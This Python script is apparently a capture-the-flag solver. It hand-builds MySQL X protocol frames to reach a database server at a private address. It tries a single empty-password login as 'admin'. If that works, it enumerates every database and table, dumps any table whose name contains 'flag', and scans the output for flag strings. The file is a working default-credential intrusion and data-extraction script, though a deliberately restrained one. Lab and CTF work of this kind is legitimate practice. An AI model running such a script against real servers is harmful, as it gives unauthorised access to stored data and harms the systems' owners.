import base64
import json
import re
import socket
import struct
import sys

HOST = "192.168.2.254"
PORT = 33060
TIMEOUT = 5.0
MAX_FRAME = 16 * 1024 * 1024


def varint(value):
    out = bytearray()
    while value > 0x7f:
        out.append((value & 0x7f) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def pb_bytes(field, value):
    value = value if isinstance(value, bytes) else value.encode("utf-8")
    return varint((field << 3) | 2) + varint(len(value)) + value


def parse_varint(data, offset):
    value = 0
    shift = 0
    while offset < len(data) and shift <= 63:
        byte = data[offset]
        offset += 1
        value |= (byte & 0x7f) << shift
        if not byte & 0x80:
            return value, offset
        shift += 7
    raise ValueError("invalid or truncated protobuf varint")


def parse_proto(data):
    fields = []
    offset = 0
    while offset < len(data):
        key, offset = parse_varint(data, offset)
        number, wire = key >> 3, key & 7
        if number == 0:
            raise ValueError("protobuf field number zero")
        if wire == 0:
            value, offset = parse_varint(data, offset)
            fields.append({"field": number, "wire": wire, "value": value})
        elif wire == 1:
            if offset + 8 > len(data):
                raise ValueError("truncated fixed64 protobuf field")
            fields.append({"field": number, "wire": wire, "hex": data[offset:offset + 8].hex()})
            offset += 8
        elif wire == 2:
            length, offset = parse_varint(data, offset)
            if length > MAX_FRAME or offset + length > len(data):
                raise ValueError("invalid or truncated length-delimited protobuf field")
            raw = data[offset:offset + length]
            offset += length
            item = {"field": number, "wire": wire, "length": length, "base64": base64.b64encode(raw).decode("ascii")}
            try:
                text = raw.decode("utf-8")
                if all(ch.isprintable() or ch in "\r\n\t" for ch in text):
                    item["text"] = text
            except UnicodeDecodeError:
                pass
            fields.append(item)
        elif wire == 5:
            if offset + 4 > len(data):
                raise ValueError("truncated fixed32 protobuf field")
            fields.append({"field": number, "wire": wire, "hex": data[offset:offset + 4].hex()})
            offset += 4
        else:
            raise ValueError("unsupported protobuf wire type %d" % wire)
    return fields


def read_exact(sock, count):
    chunks = []
    remaining = count
    while remaining:
        part = sock.recv(remaining)
        if not part:
            raise EOFError("peer closed connection while receiving a frame")
        chunks.append(part)
        remaining -= len(part)
    return b"".join(chunks)


def send_frame(sock, message_type, payload=b""):
    body = bytes([message_type]) + payload
    sock.sendall(struct.pack("<I", len(body)) + body)


def recv_frame(sock):
    header = read_exact(sock, 4)
    length = struct.unpack("<I", header)[0]
    if length < 1 or length > MAX_FRAME:
        raise ValueError("invalid MySQL X frame length %d" % length)
    body = read_exact(sock, length)
    return body[0], body[1:]


def describe_frame(direction, message_type, payload):
    names = {
        0: "OK", 1: "ERROR", 2: "CONNECTION_CAPABILITIES",
        3: "AUTHENTICATE_CONTINUE", 4: "AUTHENTICATE_OK",
        11: "NOTICE", 12: "RESULTSET_COLUMN_METADATA",
        13: "RESULTSET_ROW", 14: "RESULTSET_FETCH_DONE",
        15: "RESULTSET_FETCH_SUSPENDED", 16: "RESULTSET_FETCH_DONE_MORE",
    }
    entry = {
        "direction": direction,
        "message_type": message_type,
        "message_name": names.get(message_type, "UNKNOWN"),
        "payload_base64": base64.b64encode(payload).decode("ascii"),
    }
    try:
        entry["protobuf_fields"] = parse_proto(payload)
        entry["protobuf_parse"] = "parsed"
    except Exception as exc:
        entry["protobuf_parse"] = "failed: " + str(exc)
    return entry


def exchange_query(sock, sql, observations):
    payload = pb_bytes(1, sql) + pb_bytes(2, "sql")
    send_frame(sock, 12, payload)
    result = {"sql": sql, "frames": []}
    for _ in range(256):
        message_type, body = recv_frame(sock)
        frame = describe_frame("server", message_type, body)
        observations.append(frame)
        result["frames"].append(frame)
        if message_type in (0, 1, 14, 15, 16):
            break
    else:
        result["limitation"] = "response exceeded 256 frames"
    return result


def main():
    observations = []
    report = {
        "target": "%s:%d" % (HOST, PORT),
        "protocol_basis": "observed MySQL X fingerprint advertising MYSQL41 and SHA256_MEMORY",
        "username_attempted": "admin",
        "password_material": "none supplied; one empty-password MYSQL41 attempt only",
        "authentication_verified": False,
        "flag_observed": False,
        "frames": observations,
        "queries": [],
        "limitations": [],
    }
    try:
        with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
            sock.settimeout(TIMEOUT)
            # MySQL X Connection.CapabilitiesGet (client message type 1).
            send_frame(sock, 1)
            msg_type, payload = recv_frame(sock)
            observations.append(describe_frame("server", msg_type, payload))
            if msg_type == 1:
                report["limitations"].append("server returned an error to capabilities request")
                print(json.dumps(report, ensure_ascii=False))
                return
            if msg_type != 2:
                report["limitations"].append("unexpected response to capabilities request: type %d" % msg_type)
                print(json.dumps(report, ensure_ascii=False))
                return

            # Authenticate.Start: field 1 mechanism, field 2 username bytes.
            auth_start = pb_bytes(1, "MYSQL41") + pb_bytes(2, b"admin")
            send_frame(sock, 4, auth_start)
            msg_type, payload = recv_frame(sock)
            observations.append(describe_frame("server", msg_type, payload))
            if msg_type == 3:
                # MYSQL41 challenge received. With no supplied credential, submit
                # the empty-password response rather than guessing any password.
                send_frame(sock, 5, pb_bytes(1, b""))
                msg_type, payload = recv_frame(sock)
                observations.append(describe_frame("server", msg_type, payload))

            if msg_type == 4:
                report["authentication_verified"] = True
                report["authentication_evidence"] = "server returned AUTHENTICATE_OK after MYSQL41 exchange for admin"
                q = exchange_query(sock, "SHOW DATABASES", observations)
                report["queries"].append(q)
                database_names = []
                for frame in q["frames"]:
                    if frame["message_type"] == 13:
                        for field in frame.get("protobuf_fields", []):
                            if field.get("field") == 1 and field.get("wire") == 2:
                                try:
                                    database_names.append(base64.b64decode(field["base64"]).decode("utf-8"))
                                except Exception:
                                    pass
                database_names = list(dict.fromkeys(database_names))
                for database in database_names:
                    if not re.fullmatch(r"[A-Za-z0-9_$-]{1,128}", database):
                        continue
                    sql = "SHOW TABLES FROM `" + database.replace("`", "``") + "`"
                    table_result = exchange_query(sock, sql, observations)
                    report["queries"].append(table_result)
                    table_names = []
                    for frame in table_result["frames"]:
                        if frame["message_type"] == 13:
                            for field in frame.get("protobuf_fields", []):
                                if field.get("field") == 1 and field.get("wire") == 2:
                                    try:
                                        table_names.append(base64.b64decode(field["base64"]).decode("utf-8"))
                                    except Exception:
                                        pass
                    for table in table_names:
                        if re.search(r"flag", table, re.IGNORECASE) and re.fullmatch(r"[A-Za-z0-9_$-]{1,128}", table):
                            sql = "SELECT * FROM `" + database + "`.`" + table + "` LIMIT 20"
                            flag_result = exchange_query(sock, sql, observations)
                            report["queries"].append(flag_result)
                            joined = json.dumps(flag_result, ensure_ascii=False)
                            if re.search(r"flag\{[^}]+\}", joined, re.IGNORECASE):
                                report["flag_observed"] = True
            elif msg_type == 1:
                report["authentication_evidence"] = "server returned an error; authentication was not verified"
            else:
                report["limitations"].append("authentication exchange ended with unexpected server message type %d" % msg_type)
    except Exception as exc:
        report["limitations"].append(type(exc).__name__ + ": " + str(exc))
    print(json.dumps(report, ensure_ascii=False))


if __name__ == "__main__":
    main()

